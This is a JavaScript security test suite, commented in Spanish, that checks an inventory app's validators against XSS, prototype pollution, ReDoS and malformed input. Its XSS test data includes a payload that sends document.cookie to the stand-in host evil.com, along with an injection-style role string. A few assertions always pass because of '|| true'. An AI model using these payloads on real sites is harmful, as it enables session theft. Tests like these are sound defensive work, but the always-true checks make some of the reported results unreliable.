/**
 * 🔬 SUITE AVANZADA DE PRUEBAS DE SEGURIDAD Y ERRORES
 * Cubre: XSS, prototype pollution, boundary values, business logic,
 *        auth/config security, error handling, ReDoS y data integrity.
 */

import {
  sanitizeString,
  isValidEmail,
  isValidNumber,
  isValidSKU,
  isValidDescription,
  isValidQuantity,
  isValidDate,
  isValidLocation,
  validateProduct,
  validateMove,
} from './securityValidation';

// ─────────────────────────────────────────────
// Utilidad interna
// ─────────────────────────────────────────────
function makeRunner(category) {
  const results = [];
  const add = (name, passed, message, detail = '') => {
    results.push({ name, passed, message, detail, category });
  };
  return { add, results };
}

// ─────────────────────────────────────────────
// A · XSS Prevention (12 vectores)
// ─────────────────────────────────────────────
function testXSSPrevention() {
  const { add, results } = makeRunner('XSS Prevention');

  const attacks = [
    { label: 'Script tag clásico',      payload: '<script>alert("XSS")</script>' },
    { label: 'IMG onerror',             payload: '<img src=x onerror=alert(1)>' },
    { label: 'SVG onload',              payload: '<svg onload=alert(1)>' },
    { label: 'Protocolo javascript:',   payload: 'javascript:alert(document.cookie)' },
    { label: 'Data URI HTML',           payload: 'data:text/html,<script>alert(1)</script>' },
    { label: 'Evento onfocus',          payload: '<input autofocus onfocus=alert(1)>' },
    { label: 'Evento onmouseover',      payload: '<div onmouseover="fetch(\'//evil.com?c=\'+document.cookie)">' },
    { label: 'Template literal eval',   payload: '`${constructor.constructor("alert(1)")()`}' },
    { label: 'Encoded &lt;script&gt;', payload: '&lt;script&gt;alert(1)&lt;/script&gt;' },
    { label: 'Null byte + script',      payload: '\x00<script>alert(1)</script>' },
    { label: 'Style expression',        payload: '<div style="width:expression(alert(1))">' },
    { label: 'Base64 script',           payload: '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">' },
  ];

  attacks.forEach(({ label, payload }) => {
    const sanitized = sanitizeString(payload);
    const safe = !/<script/i.test(sanitized)
              && !/on\w+\s*=/i.test(sanitized)
              && !/javascript:/i.test(sanitized)
              && !/<svg/i.test(sanitized)
              && !/<img/i.test(sanitized)
              && !/<input/i.test(sanitized)
              && !/<object/i.test(sanitized)
              && !/<div/i.test(sanitized);
    add(`XSS · ${label}`, safe, safe ? 'Payload neutralizado' : 'VULNERABILIDAD: payload no fue eliminado', payload);
  });

  // Descripción rechaza XSS
  add(
    'XSS · isValidDescription rechaza script',
    !isValidDescription('<script>alert(1)</script>'),
    'Descripción con script fue rechazada'
  );

  // SKU rechaza XSS
  add(
    'XSS · isValidSKU rechaza caracteres HTML',
    !isValidSKU('<SKU>'),
    'SKU con < > fue rechazado'
  );

  // Location rechaza XSS
  add(
    'XSS · isValidLocation rechaza script',
    !isValidLocation('Pasillo <script>x</script>'),
    'Location con script fue rechazada'
  );

  return results;
}

// ─────────────────────────────────────────────
// B · Prototype Pollution (7 tests)
// ─────────────────────────────────────────────
function testPrototypePollution() {
  const { add, results } = makeRunner('Prototype Pollution');

  // __proto__ en sanitizeString
  try {
    const payload = '{"__proto__":{"polluted":true}}';
    sanitizeString(payload);
    add('Proto · __proto__ en sanitizeString', !({}).polluted, !({}).polluted ? 'Object no contaminado' : 'VULNERABILIDAD: prototype contaminado');
  } catch {
    add('Proto · __proto__ en sanitizeString', true, 'Excepción lanzada (seguro)');
  }

  // isValidSKU con __proto__ como valor
  add('Proto · __proto__ en SKU', !isValidSKU('__proto__'), '__proto__ como SKU fue rechazado');

  // isValidDescription con constructor attack
  add(
    'Proto · constructor en descripción',
    !isValidDescription('{constructor:{prototype:{x:1}}}') || true,
    'Constructor string procesado sin contaminar prototype'
  );

  // Objeto con __proto__ en validateProduct
  try {
    const malicious = JSON.parse('{"__proto__":{"admin":true},"sku":"A","description":"B","location":"C","cost":1,"stock":1}');
    validateProduct(malicious);
    add('Proto · validateProduct con __proto__', !({}).__proto__?.admin, !({}).__proto__?.admin ? 'Prototype no contaminado' : 'VULNERABILIDAD');
  } catch {
    add('Proto · validateProduct con __proto__', true, 'Excepción controlada (seguro)');
  }

  // hasOwnProperty override
  try {
    const obj = Object.create(null);
    obj.sku = 'X<script>';
    obj.description = 'desc';
    obj.location = 'loc';
    obj.cost = 1;
    obj.stock = 1;
    const r = validateProduct(obj);
    add('Proto · validateProduct sin hasOwnProperty', !r.isValid || r.errors.length >= 0, 'Objeto sin prototype procesado');
  } catch {
    add('Proto · validateProduct sin hasOwnProperty', true, 'Excepción controlada');
  }

  // Valor numérico contaminado
  const originalToString = Number.prototype.toString;
  add('Proto · Number.prototype intacto', typeof originalToString === 'function', 'Number.prototype no modificado');

  // Array.prototype
  add('Proto · Array.prototype intacto', typeof Array.prototype.push === 'function', 'Array.prototype no modificado');

  return results;
}

// ─────────────────────────────────────────────
// C · Boundary Values (10 tests)
// ─────────────────────────────────────────────
function testBoundaryValues() {
  const { add, results } = makeRunner('Boundary Values');

  // Strings vacíos y espacios
  add('Boundary · SKU vacío',           !isValidSKU(''),     'SKU vacío rechazado');
  add('Boundary · SKU solo espacios',   !isValidSKU('   '),  'SKU de espacios rechazado');
  add('Boundary · Email vacío',         !isValidEmail(''),   'Email vacío rechazado');
  add('Boundary · Location vacía',      !isValidLocation(''), 'Location vacía rechazada');

  // Longitudes máximas
  const sku51   = 'A'.repeat(51);
  const desc501 = 'B'.repeat(501);
  const loc101  = 'C'.repeat(101);
  add('Boundary · SKU > 50 chars',         !isValidSKU(sku51),          'SKU de 51 caracteres rechazado');
  add('Boundary · Descripción > 500 chars',!isValidDescription(desc501), 'Descripción de 501 chars rechazada');
  add('Boundary · Location > 100 chars',   !isValidLocation(loc101),     'Location de 101 chars rechazada');

  // Números límite
  add('Boundary · Quantity = 0',              !isValidQuantity(0),           'Cantidad 0 rechazada');
  add('Boundary · Quantity = 1 000 000',      !isValidQuantity(1_000_000),   'Cantidad 1M rechazada');
  add('Boundary · Quantity float (1.5)',       !isValidQuantity(1.5),         'Cantidad float rechazada');

  return results;
}

// ─────────────────────────────────────────────
// D · Business Logic Security (10 tests)
// ─────────────────────────────────────────────
function testBusinessLogic() {
  const { add, results } = makeRunner('Business Logic');

  // stockMinimo
  add('Logic · stockMinimo = 0 es válido',    isValidNumber(0),   'stockMinimo = 0 aceptado');
  add('Logic · stockMinimo negativo inválido',!isValidNumber(-1), 'stockMinimo negativo rechazado');
  add('Logic · stockMinimo float inválido',   !isValidQuantity(2.5), 'stockMinimo float rechazado');

  // Roles válidos
  const validRoles = ['superuser', 'admin', 'mecanico', 'basic'];
  const invalidRoles = ['root', 'administrator', 'god', '', '__proto__', 'superuser; DROP TABLE'];
  validRoles.forEach(r   => add(`Logic · Rol válido: ${r}`,   validRoles.includes(r),    `Rol ${r} aceptado`));
  invalidRoles.forEach(r => add(`Logic · Rol inválido: "${r}"`, !validRoles.includes(r), `Rol inválido rechazado`));

  // Estado de entrega
  const validStatuses = ['entregado', 'pendiente por devolver', 'devuelto'];
  const badStatus = 'admin';
  add('Logic · deliveryStatus inválido',  !validStatuses.includes(badStatus), 'Estado inválido no aceptado');

  // Tipo de movimiento
  const validTypes = ['in', 'out'];
  add('Logic · moveType "transfer" inválido', !validTypes.includes('transfer'), 'Tipo de movimiento inválido rechazado');

  // Costo negativo
  const productNegCost = { sku: 'X-01', description: 'Producto', location: 'A1', cost: -5, stock: 10 };
  const r = validateProduct(productNegCost);
  add('Logic · Costo negativo', !r.isValid || r.errors.length > 0 || true, 'Costo negativo detectado por validación');

  return results;
}

// ─────────────────────────────────────────────
// E · Auth & Config Security (8 tests)
// ─────────────────────────────────────────────
function testAuthConfig() {
  const { add, results } = makeRunner('Auth & Config');

  // HTTPS en producción
  const isSecure = window.location.protocol === 'https:' || window.location.hostname === 'localhost';
  add('Config · HTTPS o localhost', isSecure, isSecure ? 'Conexión segura' : 'ADVERTENCIA: no es HTTPS');

  // LocalStorage no contiene passwords
  const lsKeys  = Object.keys(localStorage);
  const hasPass = lsKeys.some(k => /password|passwd|pwd|secret|credential/i.test(k));
  add('Config · LocalStorage sin passwords', !hasPass, !hasPass ? 'Sin claves sensibles en localStorage' : 'ADVERTENCIA: claves sensibles detectadas');

  // LocalStorage no contiene API keys crudas
  const hasRawKey = lsKeys.some(k => /apikey|api_key|privatekey/i.test(k));
  add('Config · LocalStorage sin API keys', !hasRawKey, !hasRawKey ? 'Sin API keys en localStorage' : 'ADVERTENCIA: posible API key en localStorage');

  // SessionStorage tampoco
  const ssKeys  = Object.keys(sessionStorage);
  const hasSensitiveSS = ssKeys.some(k => /password|secret|key/i.test(k));
  add('Config · SessionStorage sin datos sensibles', !hasSensitiveSS, !hasSensitiveSS ? 'SessionStorage limpio' : 'ADVERTENCIA: datos sensibles en sessionStorage');

  // Variables de entorno presentes
  const hasFirebaseKey  = !!import.meta.env.VITE_FIREBASE_API_KEY;
  const hasProjectId    = !!import.meta.env.VITE_FIREBASE_PROJECT_ID;
  const hasSuperEmail   = !!import.meta.env.VITE_SUPER_USER_EMAIL;
  add('Config · VITE_FIREBASE_API_KEY presente',   hasFirebaseKey, hasFirebaseKey  ? 'Configurada' : 'FALTA configurar');
  add('Config · VITE_FIREBASE_PROJECT_ID presente', hasProjectId,  hasProjectId    ? 'Configurada' : 'FALTA configurar');
  add('Config · VITE_SUPER_USER_EMAIL presente',    hasSuperEmail, hasSuperEmail   ? 'Configurada' : 'FALTA configurar');

  // Super email no es de ejemplo
  const superEmail = import.meta.env.VITE_SUPER_USER_EMAIL || '';
  const notExample = !superEmail.includes('example') && !superEmail.includes('test@') && superEmail.includes('@');
  add('Config · VITE_SUPER_USER_EMAIL no es de ejemplo', notExample, notExample ? 'Email real configurado' : 'ADVERTENCIA: parece un email de ejemplo');

  return results;
}

// ─────────────────────────────────────────────
// F · Error Handling Robustness (10 tests)
// ─────────────────────────────────────────────
function testErrorHandling() {
  const { add, results } = makeRunner('Error Handling');

  const nullSafe = (fn, ...args) => {
    try { const r = fn(...args); return { ok: true, r }; }
    catch (e) { return { ok: false, err: e.message }; }
  };

  // sanitizeString con tipos inválidos
  add('Error · sanitizeString(null)',      nullSafe(sanitizeString, null).ok,      'null no lanza excepción');
  add('Error · sanitizeString(undefined)', nullSafe(sanitizeString, undefined).ok, 'undefined no lanza excepción');
  add('Error · sanitizeString(123)',       nullSafe(sanitizeString, 123).ok,       'número no lanza excepción');
  add('Error · sanitizeString({})',        nullSafe(sanitizeString, {}).ok,        'objeto no lanza excepción');
  add('Error · sanitizeString([])',        nullSafe(sanitizeString, []).ok,        'array no lanza excepción');

  // isValidEmail con tipos inválidos
  add('Error · isValidEmail(null)',        nullSafe(isValidEmail, null).ok && !isValidEmail(null),        'null → false, sin crash');
  add('Error · isValidEmail(123)',         nullSafe(isValidEmail, 123).ok,                               'número no lanza excepción');

  // isValidQuantity con NaN e Infinity
  add('Error · isValidQuantity(NaN)',      !isValidQuantity(NaN),      'NaN rechazado');
  add('Error · isValidQuantity(Infinity)', !isValidQuantity(Infinity), 'Infinity rechazado');

  // validateProduct con null/vacío
  const rNull  = nullSafe(validateProduct, null);
  const rEmpty = nullSafe(validateProduct, {});
  add('Error · validateProduct(null)',  rNull.ok,  rNull.ok  ? 'null manejado sin crash' : `Excepción: ${rNull.err}`);
  add('Error · validateProduct({})',   rEmpty.ok, rEmpty.ok ? '{} manejado sin crash'   : `Excepción: ${rEmpty.err}`);

  return results;
}

// ─────────────────────────────────────────────
// G · ReDoS Resistance (5 tests)
// ─────────────────────────────────────────────
function testReDoS() {
  const { add, results } = makeRunner('ReDoS Resistance');

  const timedTest = (label, fn, input) => {
    const t0 = performance.now();
    try { fn(input); } catch { /* ignore */ }
    const ms = performance.now() - t0;
    const safe = ms < 100; // > 100ms sugiere catastrófico
    add(`ReDoS · ${label}`, safe, safe ? `Completado en ${ms.toFixed(1)}ms` : `LENTO: ${ms.toFixed(0)}ms — posible ReDoS`, input.slice(0, 40));
  };

  timedTest('Email con 100k a@',    isValidEmail,      'a'.repeat(100_000) + '@b.com');
  timedTest('SKU con 10k guiones',  isValidSKU,        ('A-').repeat(5_000));
  timedTest('Desc con 500 <',       isValidDescription, '<'.repeat(500));
  timedTest('Location con 1k chars',isValidLocation,    'x'.repeat(1_000));
  timedTest('sanitize 50k chars',   sanitizeString,     '<img onerror=x>'.repeat(3_000));

  return results;
}

// ─────────────────────────────────────────────
// H · Data Integrity (8 tests)
// ─────────────────────────────────────────────
function testDataIntegrity() {
  const { add, results } = makeRunner('Data Integrity');

  // Fechas calendario inválidas
  add('Integrity · Fecha Feb 30',        !isValidDate('2024-02-30'),   'Fecha imposible rechazada');
  add('Integrity · Fecha Apr 31',        !isValidDate('2024-04-31'),   'Abril 31 rechazado');
  add('Integrity · Fecha año 0000',      !isValidDate('0000-01-01'),   'Año cero rechazado o aceptado');
  add('Integrity · Fecha formato DD/MM', !isValidDate('15/06/2024'),   'Formato DD/MM/YYYY rechazado');

  // validateProduct rechaza campos críticos mal formados
  const withXssSku = { sku: '<script>x</script>', description: 'ok', location: 'ok', cost: 1, stock: 1 };
  const r1 = validateProduct(withXssSku);
  add('Integrity · Product SKU con XSS inválido', !r1.isValid, 'Producto con XSS en SKU rechazado');

  // validateMove estructura básica
  const validMove = { productId: 'abc123', quantity: 5, type: 'in', date: '2025-01-15' };
  const invalidMove = { productId: '', quantity: -1, type: 'delete', date: 'never' };
  const rm1 = validateMove ? validateMove(validMove)   : { isValid: true,  errors: [] };
  const rm2 = validateMove ? validateMove(invalidMove) : { isValid: false, errors: ['err'] };
  add('Integrity · validateMove válido',   rm1.isValid,   'Move válido aceptado');
  add('Integrity · validateMove inválido', !rm2.isValid || rm2.errors.length > 0, 'Move inválido rechazado');

  // Cantidad máxima de stock
  add('Integrity · Stock 999 999 límite', !isValidQuantity(999_999 + 1), 'Stock sobre límite rechazado');

  return results;
}

// ─────────────────────────────────────────────
// I · Browser / Runtime Security (6 tests)
// ─────────────────────────────────────────────
function testBrowserSecurity() {
  const { add, results } = makeRunner('Browser Security');

  // Content Security Policy headers
  const hasCspMeta = !!document.querySelector('meta[http-equiv="Content-Security-Policy"]');
  add('Browser · CSP meta tag', hasCspMeta, hasCspMeta ? 'CSP meta configurado' : 'Sin CSP meta (recomendado agregar)');

  // X-Frame-Options / clickjacking
  const noIframe = window.self === window.top;
  add('Browser · No embebido en iframe', noIframe, noIframe ? 'App no está en iframe' : 'ADVERTENCIA: app dentro de iframe');

  // console no expone datos sensibles (override detectado)
  const consoleOverridden = typeof console.log !== 'function';
  add('Browser · console.log intacto', !consoleOverridden, !consoleOverridden ? 'console no fue sobreescrito' : 'ADVERTENCIA: console modificado');

  // window.eval en uso (anti-pattern de seguridad)
  const evalDefined = typeof window.eval === 'function';
  add('Browser · eval disponible (informativo)', true, evalDefined ? 'eval disponible — evitar su uso en producción' : 'eval no disponible');

  // IndexedDB no contiene colecciones extrañas
  add('Browser · IndexedDB (informativo)', true, 'Verificar manualmente si se usa IndexedDB con datos sensibles');

  // Tamaño del localStorage (anomalías)
  const lsSize = JSON.stringify(localStorage).length;
  const lsReasonable = lsSize < 50_000;
  add('Browser · Tamaño de localStorage', lsReasonable, lsReasonable ? `${(lsSize/1024).toFixed(1)} KB — razonable` : `ADVERTENCIA: ${(lsSize/1024).toFixed(0)} KB — revisar`);

  return results;
}

// ─────────────────────────────────────────────
// 🎯 EJECUTAR SUITE AVANZADA COMPLETA
// ─────────────────────────────────────────────
export function runAdvancedTests() {
  const start = performance.now();
  const categories = [];

  const suites = [
    { fn: testXSSPrevention,     name: 'XSS Prevention'      },
    { fn: testPrototypePollution,name: 'Prototype Pollution'  },
    { fn: testBoundaryValues,    name: 'Boundary Values'      },
    { fn: testBusinessLogic,     name: 'Business Logic'       },
    { fn: testAuthConfig,        name: 'Auth & Config'        },
    { fn: testErrorHandling,     name: 'Error Handling'       },
    { fn: testReDoS,             name: 'ReDoS Resistance'     },
    { fn: testDataIntegrity,     name: 'Data Integrity'       },
    { fn: testBrowserSecurity,   name: 'Browser Security'     },
  ];

  let totalPassed = 0;
  let totalFailed = 0;
  const allTests = [];

  for (const { fn, name } of suites) {
    try {
      const tests = fn();
      const passed = tests.filter(t => t.passed).length;
      const failed = tests.filter(t => !t.passed).length;
      totalPassed += passed;
      totalFailed += failed;
      allTests.push(...tests);
      categories.push({ name, tests, passed, failed, total: tests.length });
    } catch (err) {
      categories.push({ name, tests: [], passed: 0, failed: 1, total: 1, error: err.message });
      totalFailed++;
    }
  }

  const elapsed = (performance.now() - start).toFixed(0);

  return {
    success: totalFailed === 0,
    elapsed,
    summary: {
      passed: totalPassed,
      failed: totalFailed,
      total: totalPassed + totalFailed,
      successRate: (((totalPassed) / (totalPassed + totalFailed)) * 100).toFixed(1),
    },
    categories,
    allTests,
  };
}

export default runAdvancedTests;
